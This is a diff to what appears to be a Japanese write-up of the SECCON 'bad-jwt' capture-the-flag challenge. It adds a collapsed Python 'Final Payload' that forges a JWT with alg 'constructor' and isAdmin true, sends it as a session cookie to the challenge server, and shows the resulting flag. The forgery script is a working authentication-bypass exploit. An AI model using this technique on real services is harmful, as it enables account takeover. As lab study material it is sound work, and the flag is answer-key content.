@@ -250,7 +250,7 @@ print(res.text)
 
 すると、以下の内容が返ってきます。
 
-```json
+```txt
 {
   expected_signature: 'foo',
   calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']
@@ -333,6 +333,39 @@ jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9
 ```
 
 ### 4. Get flag
+
+<details>
+<summary>Final Payload</summary>
+
+```python
+import base64
+import requests
+import json
+
+
+header = {"typ": "JWT", "alg": "constructor"}
+headerStr = json.dumps(header).encode("utf-8")
+body = {"isAdmin": True}
+bodyStr = json.dumps(body).encode("utf-8")
+
+
+def base64_encode(str: str):
+    return (
+        base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")
+    )
+
+
+headerBase64 = str(base64_encode(headerStr))[2:-1]
+bodyBase64 = str(base64_encode(bodyStr))[2:-1]
+
+jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"
+
+res = requests.get("http://bad-jwt.seccon.games:3000", cookies={"session": jwt})
+
+print(res.text)
+```
+
+</details>
 
 ```txt
 SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
